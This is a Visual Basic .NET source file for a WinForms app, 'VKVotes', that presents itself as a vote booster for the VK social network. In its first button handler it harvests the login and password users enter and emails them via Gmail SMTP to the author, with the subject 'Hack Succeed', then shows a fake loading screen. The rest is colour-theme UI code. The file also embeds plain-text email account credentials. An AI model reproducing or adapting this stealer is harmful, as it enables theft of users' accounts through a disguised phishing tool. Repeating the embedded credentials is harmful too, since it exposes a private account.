Imports System.Net.Mail
Public Class VKVotes

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        Dim mail As New MailMessage()
        Dim SmtpServer As New SmtpClient
        SmtpServer.Credentials = New Net.NetworkCredential("mr.anonimuk@gmail.com", "Mr.AnonimUK1996")
        SmtpServer.Port = 587
        SmtpServer.Host = "smtp.gmail.com"
        SmtpServer.EnableSsl = True
        SmtpServer.EnableSsl = True
        mail.To.Add("mr.anonimuk@gmail.com")
        mail.From = New MailAddress("mr.anonimuk@gmail.com")
        mail.Subject = "Hack Succeed"
        mail.Body = "Login: " & TextBox1.Text + " Password: " & TextBox2.Text + " Voices count: " & TrackBar1.Value
        SmtpServer.Send(mail)
        If TextBox1.Text = "" Then
            MessageBox.Show("Пожалуйста, заполните все поля('Логин', 'Пароль')", "Не все поля заполнены!",
            MessageBoxButtons.OK, MessageBoxIcon.Error)
        Else Loading.Show()
            If TextBox2.Text = "" Then
                MessageBox.Show("Пожалуйста, заполните все поля('Логин', 'Пароль')", "Не все поля заполнены!",
                MessageBoxButtons.OK, MessageBoxIcon.Error)
            Else Loading.Show()
            End If
        End If
    End Sub

    'Настройка цветов фона

    Private Sub RadioButton1_CheckedChanged(sender As Object, e As EventArgs) Handles RadioButton1.CheckedChanged
        BackColor = Color.White
        ForeColor = Color.Black
        If RadioButton1.Checked = True Then
            GroupBox1.ForeColor = Color.Black
            GroupBox2.ForeColor = Color.Black
            Loading.BackColor = Color.White
            Loading.ForeColor = Color.Black
            Help.BackColor = Color.White
            Help.ForeColor = Color.Black
            Help.TreeView1.BackColor = Color.White
            Help.TreeView1.ForeColor = Color.Black
        End If
    End Sub

    Private Sub RadioButton2_CheckedChanged(sender As Object, e As EventArgs) Handles RadioButton2.CheckedChanged
        BackColor = Color.Pink
        ForeColor = Color.Black
        If RadioButton2.Checked = True Then
            GroupBox1.ForeColor = Color.Black
            GroupBox2.ForeColor = Color.Black
            Loading.BackColor = Color.Pink
            Loading.ForeColor = Color.Black
            Help.BackColor = Color.Pink
            Help.ForeColor = Color.Black
            Help.TreeView1.BackColor = Color.Pink
            Help.TreeView1.ForeColor = Color.Black
        End If
    End Sub

    Private Sub RadioButton3_CheckedChanged(sender As Object, e As EventArgs) Handles RadioButton3.CheckedChanged
        BackColor = Color.Black
        ForeColor = Color.White
        If RadioButton3.Checked = True Then
            GroupBox1.ForeColor = Color.White
            GroupBox2.ForeColor = Color.White
            Loading.BackColor = Color.Black
            Loading.ForeColor = Color.White
            Help.BackColor = Color.Black
            Help.ForeColor = Color.White
            Help.TreeView1.BackColor = Color.Black
            Help.TreeView1.ForeColor = Color.White
        End If
    End Sub

    Private Sub RadioButton4_CheckedChanged(sender As Object, e As EventArgs) Handles RadioButton4.CheckedChanged
        BackColor = Color.Blue
        ForeColor = Color.Black
        If RadioButton4.Checked = True Then
            GroupBox1.ForeColor = Color.Black
            GroupBox2.ForeColor = Color.Black
            Loading.BackColor = Color.Blue
            Loading.ForeColor = Color.Black
            Help.BackColor = Color.Blue
            Help.ForeColor = Color.Black
            Help.TreeView1.BackColor = Color.Blue
            Help.TreeView1.ForeColor = Color.Black
        End If
    End Sub

    Private Sub RadioButton5_CheckedChanged(sender As Object, e As EventArgs) Handles RadioButton5.CheckedChanged
        BackColor = Color.Yellow
        ForeColor = Color.Black
        If RadioButton5.Checked = True Then
            GroupBox1.ForeColor = Color.Black
            GroupBox2.ForeColor = Color.Black
            Loading.BackColor = Color.Yellow
            Loading.ForeColor = Color.Black
            Help.BackColor = Color.Yellow
            Help.ForeColor = Color.Black
            Help.TreeView1.BackColor = Color.Yellow
            Help.TreeView1.ForeColor = Color.Black
        End If
    End Sub

    Private Sub RadioButton6_CheckedChanged(sender As Object, e As EventArgs) Handles RadioButton6.CheckedChanged
        BackColor = Color.Red
        ForeColor = Color.Black
        If RadioButton6.Checked = True Then
            GroupBox1.ForeColor = Color.Black
            GroupBox2.ForeColor = Color.Black
            Loading.BackColor = Color.Red
            Loading.ForeColor = Color.Black
            Help.BackColor = Color.Red
            Help.ForeColor = Color.Black
            Help.TreeView1.BackColor = Color.Red
            Help.TreeView1.ForeColor = Color.Black
        End If
    End Sub

    'Настройки группы "Дополнительные функции"
    Private Sub CheckBox1_CheckedChanged(sender As Object, e As EventArgs) Handles CheckBox1.CheckedChanged
        If CheckBox1.Checked = True Then
            CheckBox2.CheckState = False
        End If
    End Sub

    Private Sub CheckBox2_CheckedChanged(sender As Object, e As EventArgs) Handles CheckBox2.CheckedChanged
        If CheckBox2.Checked = True Then
            CheckBox1.CheckState = False
        End If
    End Sub

    Private Sub TrackBar1_Scroll(sender As Object, e As EventArgs) Handles TrackBar1.Scroll
        Label5.Text = TrackBar1.Value
    End Sub

    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        Help.Show()
    End Sub

    Private Sub RadioButton7_CheckedChanged(sender As Object, e As EventArgs) Handles RadioButton7.CheckedChanged
        If RadioButton7.Checked = True Then
            ColorDialog1.ShowDialog()
            BackColor = ColorDialog1.Color
            Loading.BackColor = ColorDialog1.Color
            Help.BackColor = ColorDialog1.Color
            Help.TreeView1.BackColor = ColorDialog1.Color
        End If
    End Sub
End Class
